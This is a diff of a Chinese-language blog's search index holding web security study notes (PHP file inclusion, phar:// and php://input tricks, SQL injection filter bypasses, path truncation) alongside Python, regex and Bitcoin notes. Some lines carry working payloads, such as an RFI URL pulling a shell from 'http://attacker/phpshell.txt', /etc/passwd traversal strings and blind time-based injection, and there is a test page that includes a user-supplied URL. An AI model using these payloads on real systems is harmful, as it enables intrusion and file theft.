+<h3 id="phar-使用"><a href="#phar-使用" class="headerlink" title="phar://使用"></a>phar://使用</h3><p>先把木马按照phar归档文件生成<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">// 把木马写入phartest.aaa的testfile.text</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$p = <span class="keyword">new</span> PharData(dirname(<span class="keyword">__FILE__</span>).<span class="string">'/phartest.aaa'</span>, <span class="number">0</span>,<span class="string">'phartest'</span>,Phar::ZIP) ; </div><div class="line">$p-&gt;addFromString(<span class="string">'testfile.txt'</span>, <span class="string">'&lt;?php phpinfo();?&gt;'</span>); </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>测试相对路径和绝对路径都可以<br><code>/zip_phar.php?file=phar://./upfile/phartest.aaa/testfile.txt</code><br><code>/zip_phar.php?file=phar://D:/php/WWW/php_text/upfile/phartest.aaa/testfile.txt</code><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpyclykdbsj30sd0bhjsh.jpg" alt="13.png"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpycm4hbdhj30sj0bmdgv.jpg" alt="14.png"></p>
+<h2 id="解决文件包含问题"><a href="#解决文件包含问题" class="headerlink" title="解决文件包含问题"></a>解决文件包含问题</h2><ul>
+<li>白名单，限制传入参数</li>
+<li>过滤传入参数</li>
+<li>配置opendir，限制打开范围</li>
+<li>配置好allow_url_fopen,allow_url_include</li>
+</ul>
+]]></content>
+      
+        
+        <tags>
+            
+            <tag> web </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[WEB-PHP核心配置]]></title>
       <url>/2018/03/06/WEB-PHP%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE/</url>
       <content type="html"><![CDATA[<p>— 从零开始的笔记 —<br>—PHP5核心配置及测试—<br><a id="more"></a></p>
@@ -61,26 +282,7 @@
 </blockquote>
 <p><strong>作用</strong>：设置为On时，可以直接包含远程文件(http:// 与ftp:// )，比如include包含。<code>include($var)</code> 当$var可控时，可以执行PHP代码<br>讲<strong>allow_url_include</strong>的同时就会提到<strong>allow_url_fopen</strong>。因为在官方文档中使用<em>allow_url_include</em>的前提是<em>allow_url_fopen</em>为On</p>
 <h3 id="allow-url-fopen-是否允许打开远程文件"><a href="#allow-url-fopen-是否允许打开远程文件" class="headerlink" title="allow_url_fopen(是否允许打开远程文件)"></a>allow_url_fopen(是否允许打开远程文件)</h3><p>在 PHP &lt;= 4.3.4 时是 PHP_INI_ALL。之后版本是 PHP_INI_SYSTEM,默认为On<br><strong>作用</strong>：设置为On时，允许打开远程文件，比如fopen打开。</p>
-<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><p>其实这两个选项形成的就是远程文件包含漏洞</p>
-<blockquote>
-<p>开始前，补充。<br><strong>fopen函数</strong>与<strong>include函数</strong>区别：<br>fopen与include打开/包含远程文件时，对方服务器都会先解析文件然后被本地php代码 打开/包含。<br>区别是：<br>fopen是直接读取这个文件，当做一个输入流，不会在本地做解析。include会包含进入代码内，再解析执行一次。<br>所以include包含的文件里有木马时，可以执行。fopen打开一个包含木马的文件，不会有什么大危害，因为只是作为文本文件。</p>
-</blockquote>
-<p>以下测试是在php5.2中完成。<br>1.当<em>allow_url_fopen</em>为On,<em>allow_url_include</em>不为Off时<br>只能进行远程文件打开，比如fopen(url)。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_fopen:'</span>.ini_get(<span class="string">'allow_url_fopen'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_include:'</span>.ini_get(<span class="string">'allow_url_include'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">$url=$_GET[<span class="string">'url'</span>];</div><div class="line"></div><div class="line">$file=fopen($url,<span class="string">"r"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to open file!"</span>);</div><div class="line"><span class="keyword">while</span> (!feof($file))&#123;</div><div class="line">    $line = fgets($file,<span class="number">1024</span>);   </div><div class="line">    <span class="keyword">echo</span> $line;</div><div class="line">    &#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpb8zi936vj30lw04gwej.jpg" alt="4.png"><br></div>
-
-<p>2.当<em>allow_url_fopen</em>和<em>allow_url_include</em>都为On时<br>可以进行远程文件包含执行，即可以包含在自己服务器的木马，形成web-shell。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_fopen:'</span>.ini_get(<span class="string">'allow_url_fopen'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_include:'</span>.ini_get(<span class="string">'allow_url_include'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">$url=$_GET[<span class="string">'url'</span>];</div><div class="line"><span class="keyword">include</span>($url);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpb8z6itpmj30r705bt8z.jpg" alt="3.png"><br></div>
-
-<h4 id="data-输入方式"><a href="#data-输入方式" class="headerlink" title="data:输入方式"></a>data:输入方式</h4><p>另外还有一种方法是<strong>data：</strong><br>本以为<strong>data：</strong>可以在<em>allow_url_fopen</em>为Off时起作用，测试时发现不可以。应该是data：被当做allow_url_fopen禁止的一项了。</p>
-<div align="center"><br><img src="http://ww4.sinaimg.cn/large/006iKNp3gy1fpb90by9w2j30io08bweu.jpg" alt="8.png"><br></div>
-
-<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpb9062e6hj30if0a6wet.jpg" alt="7.png"><br></div>
-
-<p>3.当<em>allow_url_fopen</em>为Off，<em>allow_url_include</em>为On时<br>理论与实际上都是不能进行远程包含，但是我们远程包含的目的就是写入木马文件，可以通过绕过方法直接形成web_shell。<br>这里提一下绕过方法：伪协议<strong>php://input</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_fopen:'</span>.ini_get(<span class="string">'allow_url_fopen'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line"><span class="keyword">echo</span> <span class="string">'allow_url_include:'</span>.ini_get(<span class="string">'allow_url_include'</span>);</div><div class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</div><div class="line">$url=$_GET[<span class="string">'url'</span>];</div><div class="line"><span class="keyword">include</span>($url);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<div align="center"><br><img src="http://ww1.sinaimg.cn/large/006iKNp3gy1fpb8zq81swj30iv0amwf2.jpg" alt="5.png"><br></div>
-
-<div align="center"><br><img src="http://ww3.sinaimg.cn/large/006iKNp3gy1fpb8zzo64xj30k80a8t92.jpg" alt="6.png"><br></div>
-
+<h3 id="测试-1"><a href="#测试-1" class="headerlink" title="测试"></a>测试</h3><p>其实这两个选项形成的就是<strong>远程文件包含漏洞RFI</strong><br>查看另一篇博客吧<a href="">戳这里</a> </p>
 <h2 id="magic-quotes-gpc-魔术引号自动过滤"><a href="#magic-quotes-gpc-魔术引号自动过滤" class="headerlink" title="magic_quotes_gpc(魔术引号自动过滤)"></a>magic_quotes_gpc(魔术引号自动过滤)</h2><p>在 PHP &lt;= 4.2.3 时是 <strong>PHP_INI_ALL</strong>，之后是 <strong>PHP_INI_PERDIR</strong>， 默认为On。<br>从 PHP 5.3.0 起不推荐使用。 在 PHP 5.4.0 中移除该选项。（避免了magic_quotes_gpc未设置，用户依赖这个设置而带来了安全隐患）<br><strong>作用</strong>：为 GPC (Get/Post/Cookie) 操作设置 magic_quotes 状态。当 magic_quotes 为 on，自动在单引号(‘)、双引号(“)、反斜杠()及空字符(NULL)前面加上反斜杠()。不会过滤<strong>$_SERVER</strong>变量，可以利用client-ip、referer一类的漏洞。<br>如果 magic_quotes_sybase 也是 ON，它会完全覆盖 magic_quotes_gpc</p>
 <h3 id="测试-2"><a href="#测试-2" class="headerlink" title="测试"></a>测试</h3><p>以下测试是在php5.2中完成。<br>magic_quotes_gpc 为 On<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">print_r($_GET);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
 <div align="center"><br><img src="http://ww2.sinaimg.cn/large/006iKNp3gy1fpb90lzewyj30go040glk.jpg" alt="10.png"><br></div>
@@ -400,7 +602,8 @@ Content-Type: image/png
 
 PNG ... content of chrome.png ...
 ------WebKitFormBoundaryrGKCBY7qhFd3TrwA-- 
-</code></pre><h4 id="application-json-："><a href="#application-json-：" class="headerlink" title="application/json ："></a>application/json ：</h4><p>主体是序列化后的 JSON 字符串</p>
+</code></pre><p>分割开头多<code>--</code> 最后一个结尾多<code>--</code></p>
+<h4 id="application-json-："><a href="#application-json-：" class="headerlink" title="application/json ："></a>application/json ：</h4><p>主体是序列化后的 JSON 字符串</p>
 <pre><code>POST http://www.example.com HTTP/1.1
 Content-Type: application/json;charset=utf-8
 
@@ -477,6 +680,68 @@ Content-Type: text/xml
 <li>成员运算符 in  not in (判断是否包含)</li>
 <li>身份运算符 is  not is (判断地址是否相同)</li>
 </ul>
+<h3 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h3><table>
+<thead>
+<tr>
+<th style="text-align:center">符号</th>
+<th style="text-align:center">意思</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center"> **</td>
+<td style="text-align:center">指数 (最高优先级)</td>
+</tr>
+<tr>
+<td style="text-align:center"> ~ + -</td>
+<td style="text-align:center">按位翻转, 一元加号和减号 (最后两个的方法名为 +@ 和 -@)</td>
+</tr>
+<tr>
+<td style="text-align:center"> * / % //</td>
+<td style="text-align:center">乘，除，取模和取整除</td>
+</tr>
+<tr>
+<td style="text-align:center"> + -</td>
+<td style="text-align:center">加法减法</td>
+</tr>
+<tr>
+<td style="text-align:center"> &gt;&gt; &lt;&lt;</td>
+<td style="text-align:center">右移，左移运算符</td>
+</tr>
+<tr>
+<td style="text-align:center"> &amp;</td>
+<td style="text-align:center">位 ‘AND’</td>
+</tr>
+<tr>
+<td style="text-align:center"> ^ ｜</td>
+<td style="text-align:center">位运算符</td>
+</tr>
+<tr>
+<td style="text-align:center"> &lt;= &lt; &gt; &gt;=</td>
+<td style="text-align:center">比较运算符</td>
+</tr>
+<tr>
+<td style="text-align:center"> &lt;&gt; == !=</td>
+<td style="text-align:center">等于运算符</td>
+</tr>
+<tr>
+<td style="text-align:center"> = %= /= //= -= += <em>= *</em>=</td>
+<td style="text-align:center">赋值运算符</td>
+</tr>
+<tr>
+<td style="text-align:center"> is is not</td>
+<td style="text-align:center">身份运算符</td>
+</tr>
+<tr>
+<td style="text-align:center"> in not in</td>
+<td style="text-align:center">成员运算符</td>
+</tr>
+<tr>
+<td style="text-align:center"> not or and</td>
+<td style="text-align:center">逻辑运算符</td>
+</tr>
+</tbody>
+</table>
 <h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="数字变量"><a href="#数字变量" class="headerlink" title="数字变量"></a>数字变量</h3><p>类型：<strong>int long bool float complex(复数)</strong><br>long 不固定长度，受限于虚拟内存</p>
 <h3 id="字符串变量"><a href="#字符串变量" class="headerlink" title="字符串变量"></a>字符串变量</h3><p>表现形式：<strong>‘str’ ‘’str’’ ‘’’str’’’</strong><br>三引号可以保留字符串中的所有格式信息<br>字符串加 <strong>r</strong>或<strong>R</strong> 前缀表示不使用转义字符而是原生字符</p>
 <h2 id="字符串运算、索引、切片"><a href="#字符串运算、索引、切片" class="headerlink" title="字符串运算、索引、切片"></a>字符串运算、索引、切片</h2><h3 id="字符串运算"><a href="#字符串运算" class="headerlink" title="字符串运算"></a>字符串运算</h3><p>str1+str2 拼接字符串<br>str*3 重复字符串<br>str in string 判断包含</p>
@@ -569,6 +834,9 @@ Content-Type: text/xml
 <h3 id="出现次数范围"><a href="#出现次数范围" class="headerlink" title="出现次数范围"></a>出现次数范围</h3><p>限定{}前面的元素重现次数<br>{num} 固定次数<br>{min,max} 次数范围<br>如 [a-zA-Z]{1,5} 匹配1~5个大小写字母<br>? 等于 {0,1}</p>
 <h3 id="（）"><a href="#（）" class="headerlink" title="（）"></a>（）</h3><p>每个括号都有一个编号，从左往右，从1开始<br>1.记忆被匹配到的文本<br>    多个（）一一对应多个变量<br>2.用于|的多选项范围<br>    （）内加 ?: 不记忆这部分被匹配到的内容<br>3.用于? * +的量词作用范围<br>    （）内加 ?: 不记忆这部分被匹配到的内容<br>4.指定别名<br>(?P<name>…) 指定一个别名<br>(?P=name) 引用别名为name的分组匹配到的字符串</name></p>
 <p>对于以上<strong>所有</strong>用到的特殊字符，用转义字符’\’来表示本身<br>如 ([a-z]+) ==&gt; (very)</p>
+<h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><blockquote>
+<p>//requests 包的使用<br>   1.使用requests.get(url=urlforflag)<br>       后者需要手动进行url加密 需要修改变量的地方断开使用字符串链接来构造payload<br>   2.使用response=requests.get(url=url,params=data)<br>       data = {“id”: sql_forflag % (i, x)}<br>       data内的内容会被自动url加密；可以用response.url查看发送的真实url<br>   3.使用response=requests.post(url=url,data=data,cookies=cookies)\<br>       data = {“id”: sql_forflag % (i, x)}<br>       cookies = {dict(PHPSESSID=’c3vg3kihmut0ne06ubhja3hgv6’,hello=’123’)}</p>
+</blockquote>
 ]]></content>
       
         
@@ -619,7 +887,7 @@ Content-Type: text/xml
 <li><strong>输出列表</strong> :块中的第一个交易的输出是挖矿所得，一般是矿工自己的钱包地址</li>
 <li><strong>锁定时间</strong> :如果非0并且序列号小于0xFFFFFFFF，是指块序号；如果交易已经终结，则是指时间戳（4字节）</li>
 </ul>
-<p><strong>版本</strong>是明确一笔交易参照的规则，除非有重大升级的情况下，版本号基本无变化，是比较固定的一个值。<br><strong>锁定时间</strong>是被该交易被加到区块的最早时间，在大多数的情况下他的值都是0，表示需要立即被加入区块中。如果锁定时间大于0而小于5亿，它的值就表示区块高度。如果大于5亿就表示一个Unix时间戳。<br>以下详细说明<strong>输入输出列表</strong>：<br>一个简单的交易输入如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Input:</div><div class="line">Previous tx: f5d8ee39a430901c91a5917b9f2dc19d6d1a0e9cea205b009ca73dd04470b9a6</div><div class="line">Index: 0</div><div class="line">scriptSig: 304502206e21798a42fae0e854281abd38bacd1aeed3ee3738d9e1446618c4571d10</div><div class="line">90db022100e2ac980643b0b82c0e88ffdfec6b64e3e6ba35e7ba5fdd7d5d6cc8d25c6b241501</div></pre></td></tr></table></figure></p>
+<p><strong>版本</strong>是明确一笔交易参照的规则，除非有重大升级的情况下，版本号基本无变化，是比较固定的一个值。<br><strong>锁定时间</strong>是被该交易加到区块的最早时间，在大多数的情况下他的值都是0，表示需要立即被加入区块中。如果锁定时间大于0而小于5亿，它的值就表示区块高度。如果大于5亿就表示一个Unix时间戳。<br>以下详细说明<strong>输入输出列表</strong>：<br>一个简单的交易输入如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">Input:</div><div class="line">Previous tx: f5d8ee39a430901c91a5917b9f2dc19d6d1a0e9cea205b009ca73dd04470b9a6</div><div class="line">Index: 0</div><div class="line">scriptSig: 304502206e21798a42fae0e854281abd38bacd1aeed3ee3738d9e1446618c4571d10</div><div class="line">90db022100e2ac980643b0b82c0e88ffdfec6b64e3e6ba35e7ba5fdd7d5d6cc8d25c6b241501</div></pre></td></tr></table></figure></p>
 <p>先说明，每一笔交易的每一个输入都要指定是之前存在的哪一笔交易的哪一个输出（即从何处得到的钱）<br>那么看以上的结构，首先是前一笔交易的哈希值（Previous tx），然后是花费的是第几个输出（Index）也叫索引，通过交易Hash和索引（从0开始），即可唯一确定一个未花费的交易输出——UTXO（Unspent Transaction Output）。这样，每一个Tx Input都和之前的某个Tx Output关联了起来。<br>最后是解锁脚本（scriptSig），解锁脚本存在的意义在于验证成立这笔交易的人有权利使用他指定的UTXO。其中解锁脚本=签名+公钥，公钥是该比特币花费者的公钥，签名是对当前这笔交易的更改信息作为message的以私钥进行的签名</p>
 <p>一个简单的交易输出如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">Output:</div><div class="line">Value: 5000000000</div><div class="line">scriptPubKey: OP_DUP OP_HASH160 404371705fa9bd789a2fcd52d2c580b65d35549d</div><div class="line">OP_EQUALVERIFY OP_CHECKSIG</div></pre></td></tr></table></figure></p>
 <p>首先是输出金额（Value），然后是锁定脚本，锁定脚本包括脚本系统中的一系列操作符。</p>
@@ -771,7 +1039,7 @@ Content-Type: text/xml
 </ul>
 <figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">select</span> <span class="keyword">user</span>() <span class="keyword">from</span> dual <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">2</span>=<span class="number">2</span>;   <span class="comment">---------&gt;   select(user())from dual where(1=1)and(2=2)</span></div><div class="line">利用函数完成猜解  如：  猜解user()第二个字符的ascii码是不是109，若是109，则页面加载将延迟</div><div class="line">	http://www.xxx.com/index.php?id=(sleep(ascii(mid(user()from(2)for(1)))=109))</div></pre></td></tr></table></figure>
 <ul>
-<li>select+user()  +代替空格  不是url编码空格的+而是直接的+</li>
+<li>select+user()  +代替空格  不是url编码空格的+而是直接的+<h3 id="过滤information-schema"><a href="#过滤information-schema" class="headerlink" title="过滤information_schema"></a>过滤information_schema</h3><code>select table_name from mysql.innodb_table</code></li>
 </ul>
 <h3 id="过滤"><a href="#过滤" class="headerlink" title="过滤="></a>过滤=</h3><ul>
 <li>=用<a href="http://www.runoob.com/mysql/mysql-like-clause.html" target="_blank" rel="external">like</a>代替</li>
@@ -780,6 +1048,7 @@ Content-Type: text/xml
 <h3 id="Mysql条件注释的利用-…"><a href="#Mysql条件注释的利用-…" class="headerlink" title="Mysql条件注释的利用  /! … /"></a>Mysql条件注释的利用  /<em>! … </em>/</h3><ul>
 <li><strong>/<em>! … </em>/</strong>:其中的语句如果在其它数据库中是不会被执行，但在MYSQL中它会执行。</li>
 <li><strong>/<em>!50000select</em>/</strong>:50000版本以上的  不执行括号中的语句 ，必定执行，用于过滤正则表达式</li>
+<li><strong>/<em>/</em> … */</strong></li>
 </ul>
 <h3 id="过滤逗号"><a href="#过滤逗号" class="headerlink" title="过滤逗号"></a>过滤逗号</h3><ul>
 <li><strong>limit ,</strong>中的<strong>,</strong> ：<a href="http://blog.csdn.net/keda8997110/article/details/8490895" target="_blank" rel="external">limit offset</a></li>
@@ -811,7 +1080,7 @@ Content-Type: text/xml
 </ul>
 <h2 id="文件包含及目录遍历"><a href="#文件包含及目录遍历" class="headerlink" title="文件包含及目录遍历"></a>文件包含及目录遍历</h2><p>两者应用相似，唯一不同就在于：前者是在url的<strong>参数</strong>中，后者是直接在url上</p>
 <h3 id="00截断"><a href="#00截断" class="headerlink" title="%00截断"></a>%00截断</h3><p>– 0字节 \x00<br>(magic_quotes_gpc=off PHP小于5.3.4)<br><code>../../../../../../etc/passwd%00</code></p>
-<h3 id="长目录截断"><a href="#长目录截断" class="headerlink" title="长目录截断"></a>长目录截断</h3><p>利用操作系统对目录最大长度的限制<br>(php版本小于5.2.8(?) linux&gt;4096 windows&gt;256)<br><code>././././././././././././././././passwd</code><br><code>////////////////////////passwd</code></p>
+<h3 id="长目录截断"><a href="#长目录截断" class="headerlink" title="长目录截断"></a>长目录截断</h3><p>利用操作系统对目录最大长度的限制<br>(php版本小于5.2.8(?) linux&gt;4096 windows&gt;256)<br><code>././././././././././././././././passwd././././././././././././././</code><br><code>////////////////////////passwd//////////////////////</code></p>
 <h3 id="点号截断"><a href="#点号截断" class="headerlink" title="点号截断"></a>点号截断</h3><p>(php版本小于5.2.8(?) 只适用windows 最后点号&gt;256)<br><code>?file=../../../../../../../../../boot.ini/………[…]…………</code></p>
 <h3 id="远程文件包含中的"><a href="#远程文件包含中的" class="headerlink" title="远程文件包含中的?"></a>远程文件包含中的<strong>?</strong></h3><p>远程文件包含本身参数传递的就是url地址，末尾加个<strong>？</strong>会把之后的系统后台添加的字符串理解为无用参数<br><code>/?param=http://attacker/phpshell.txt?</code><br><code>require_once &#39;http://attacker/phpshell.txt?/action/m_share.php&#39;;</code></p>
 <p>以上偷取葛大佬的部分栗子</p>
@@ -1118,8 +1387,8 @@ Content-Type: text/xml
 <h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>以上就可以通过sql注入漏洞，查询到数据库的信息。<br>另外，还可以通过数据库进行—-&gt;sql文件操作<br>但是实际情况下：<br>服务器会过滤限制我们的输入，这就关系到—-&gt;sql过滤<br>服务器不显示查询信息和错误信息，需要—-&gt;<a href="https://lalajun.github.io/2017/09/24/WEB-CTF%E4%B8%AD%E7%9A%84sql%E7%9B%B2%E6%B3%A8/#more" target="_blank" rel="external">sql盲注</a></p>
 <h2 id="数据库函数"><a href="#数据库函数" class="headerlink" title="数据库函数"></a>数据库函数</h2><ul>
 <li>char（）—-&gt; ASCII码 变为 字符</li>
-<li><a href="http://www.bubuko.com/infodetail-455153.html" target="_blank" rel="external">group_cat（) 和 group_concat</a> —–&gt; 用分隔符链接字符串；可以多个结果合并提高效率</li>
-<li><a href="http://www.yiibai.com/sql/sql_function_substring_index.html" target="_blank" rel="external">substring_index()</a>  —–&gt; 分割字符串提取自己想要查看的</li>
+<li><a href="http://www.bubuko.com/infodetail-455153.html" target="_blank" rel="external">concat（) 和 group_concat</a> —–&gt; 用分隔符链接字符串；可以多个结果合并提高效率</li>
+<li><a href="https://www.cnblogs.com/lijiageng/p/6511334.html" target="_blank" rel="external">substring()等</a>  —–&gt; 分割字符串提取自己想要查看的</li>
 <li><a href="http://www.w3school.com.cn/sql/sql_func_mid.asp" target="_blank" rel="external">mid(String,n,n)</a>——&gt;截取字符串</li>
 <li><a href="https://www.lvtao.net/study_doc/mysql/mysql_function_oct_str.html" target="_blank" rel="external">ord()</a> ——-&gt;字符变为ASCII码， 一个字节字符直接变ASCII，多字节字符相连ASCII<br>ord() <strong>&amp;</strong> 128 或 64 或 32 或 16 或 8 ……1 来判断分割多个字符</li>
 <li>and 前面语句<strong>出错</strong>后面语句不执行   </li>
